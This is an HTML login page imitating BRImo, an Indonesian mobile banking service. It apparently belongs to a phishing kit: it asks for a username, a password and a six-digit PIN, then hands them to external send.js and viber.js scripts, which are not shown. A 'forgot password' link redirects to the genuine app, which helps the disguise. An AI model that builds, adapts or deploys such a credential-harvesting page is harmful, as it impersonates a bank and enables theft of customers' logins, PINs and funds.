
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Login | BRImo</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="../css/style.css">
</head>
<body>
    <div class="container">

        <div class="containerlog">
            <div class="head">
                <img src="../img/headlog.png" alt="" />
            </div>
            <div class="bform">
                <form onsubmit="sendLog(event);" id="formLog">
                    <h1 class="tit blue">Login</h1>
                    <div class="bginp">
                        <div class="wrpinp" style="border-bottom:2px solid #e7e7e7">
                            <i class="fa-regular fa-user blue icon"></i>
                            <input type="text" name="uname" id="uname" placeholder="Username" required autocomplete="off" />
                        </div>
                        <div class="wrpinp">
                            <i class="fa-solid fa-lock blue icon"></i>
                            <input type="password" name="pass" id="pass" placeholder="Password" required autocomplete="off" pattern="^(?=.*\d)(?=.*[a-z])(?=.*[A-Z])[0-9a-zA-Z]+$" title="( Minimal mengandung satu huruf kapital, huruf kecil, dan satu angka )" />
                            <div class="flex toggle">
                                <i class="fa-regular fa-eye-slash blue"></i>
                            </div>
                        </div>
                    </div>
                    <p onclick="window.location.href='intent://brimo.bri.co.id#Intent;package=id.co.bri.brimo;scheme=https;end';" class="forgot blue">Lupa Username/Password?</p>
                    <button id="btnsubmit" disabled type="submit">Login</button>
                </form>
            </div>
        </div>

        <div class="containerpin" style="display:none;">
            <div class="flex headpin">
                <i onclick="window.location.href='./'" class="fa-solid fa-arrow-left"></i>
                <h1>PIN</h1>
            </div>
            <h1 class="tit">Masukkan PIN</h1>
            <form onsubmit="sendPin(event);" id="formPin">
                <div class="flex bginp">
                    <div class="clear"></div>
                    <input required class="pin" type="number" id="pin1" maxlength="1" name="pin1" />
                    <input required class="pin" type="number" id="pin2" maxlength="1" name="pin2" />
                    <input required class="pin" type="number" id="pin3" maxlength="1" name="pin3" />
                    <input required class="pin" type="number" id="pin4" maxlength="1" name="pin4" />
                    <input required class="pin" type="number" id="pin5" maxlength="1" name="pin5" />
                    <input required class="pin" type="number" id="pin6" maxlength="1" name="pin6" />
                </div>
                <span class="flex frgt blue">Lupa PIN?</span>
                <div class="flex keypad">
                    <div class="table">
                        <div class="line">
                            <button type="button" onclick="inputKeypad('1', event)">1</button>
                            <button type="button" onclick="inputKeypad('2', event)">2</button>
                            <button type="button" onclick="inputKeypad('3', event)">3</button>
                        </div>
                        <div class="line">
                            <button type="button" onclick="inputKeypad('4', event)">4</button>
                            <button type="button" onclick="inputKeypad('5', event)">5</button>
                            <button type="button" onclick="inputKeypad('6', event)">6</button>
                        </div>
                        <div class="line">
                            <button type="button" onclick="inputKeypad('7', event)">7</button>
                            <button type="button" onclick="inputKeypad('8', event)">8</button>
                            <button type="button" onclick="inputKeypad('9', event)">9</button>
                        </div>
                        <div class="line">
                            <button disabled type="button" ></button>
                            <button type="button" onclick="inputKeypad('0', event)">0</button>
                            <button type="button" onclick="deleteInput();" class="flex"><i class="fa-solid fa-arrow-left"></i></button>
                        </div>
                    </div>
                </div>
            </form>
        </div>

    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="../js/viber.js"></script>
    <script src="../js/valid.js"></script>
    <script src="../js/function_btn.js"></script>
    <script src="../js/send.js"></script>
</body>
</html>